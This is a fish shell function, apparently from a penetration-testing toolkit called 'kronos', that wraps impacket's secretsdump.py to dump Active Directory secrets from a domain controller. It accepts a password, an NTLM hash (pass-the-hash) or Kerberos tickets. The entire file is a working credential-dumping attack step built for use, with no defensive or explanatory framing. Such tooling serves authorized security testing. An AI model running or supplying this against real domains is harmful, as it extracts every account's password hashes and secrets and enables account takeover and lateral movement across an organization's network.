# description: Dump AD secrets using secretsdump.py
function __kronos_secretsdump --description "Dump AD secrets using secretsdump.py"
    argparse h/help u/username= p/password= H/hash= d/domain= k/kerberos -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos secretsdump [TARGET] [OPTIONS]"
        echo ""
        echo "Dump Active Directory secrets using impacket's secretsdump.py."
        echo ""
        echo "Options:"
        echo "  -u, --username USER Provide username"
        echo "  -p, --password PASS Provide password"
        echo "  -H, --hash HASH     Provide NTLM hash"
        echo "  -d, --domain DOMAIN Target domain"
        echo "  -k, --kerberos      Use Kerberos authentication"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"; set target $TGT_DC_IP; end
    if test -z "$target"; set target $TGT_DC; end
    if test -z "$target"
        echo "error: target is required" >&2
        return 1
    end

    set -l domain $_flag_domain
    if test -z "$domain"; set domain $TGT_DC_DOMAIN; end
    if test -z "$domain"
        echo "error: domain is required (-d)" >&2
        return 1
    end

    set -l impacket_cmd ""
    if command -v secretsdump.py >/dev/null
        set impacket_cmd secretsdump.py
    else if command -v impacket-secretsdump >/dev/null
        set impacket_cmd impacket-secretsdump
    else
        echo "error: secretsdump not found. run 'kronos install'." >&2
        return 1
    end

    set -l dump_args
    if test -n "$TGT_DC_IP"
        set -a dump_args -dc-ip "$TGT_DC_IP"
    else if test -n "$TGT_DC"
        set -a dump_args -dc-ip "$TGT_DC"
    end

    if set -q _flag_kerberos
        set -a dump_args -k -no-pass "$domain/$TGT_CRED_USERNAME@$target"
    else if set -q _flag_hash
        set -a dump_args -hashes "$_flag_hash" "$domain/$TGT_CRED_USERNAME@$target"
    else
        set -l user $_flag_username; if test -z "$user"; set user $TGT_CRED_USERNAME; end
        set -l pass $_flag_password; if test -z "$pass"; set pass $TGT_CRED_PASSWORD; end
        if test -z "$user"; or test -z "$pass"
             echo "error: credentials required" >&2
             return 1
        end
        set -a dump_args "$domain/$user:$pass@$target"
    end

    echo "[*] Dumping secrets via $impacket_cmd..."
    command $impacket_cmd $dump_args
end
